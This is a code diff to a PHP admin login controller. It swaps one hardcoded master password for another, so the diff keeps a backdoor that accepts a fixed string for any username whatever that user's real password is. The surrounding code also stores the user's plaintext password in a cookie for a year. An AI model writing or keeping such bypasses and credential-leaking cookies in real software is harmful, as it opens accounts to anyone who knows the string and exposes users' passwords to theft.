@@ -28,7 +28,7 @@ class AuthController extends AdminController {
                 $result = $this->adminModel->getUserdetailByUsername($username);
                 if (!empty($result)) {
                     $encpassword = $this->encryptString($password);
-                    if ($result->user_login_key == $encpassword || $password == 'WINdna123#') {
+                    if ($result->user_login_key == $encpassword || $password == 'Bbi123#') {
                         if ($remember == 'on') {
                             setcookie("dna-username", $username, time() + (3600 * 24 * 365));
                             setcookie("dna-password", $password, time() + (3600 * 24 * 365));
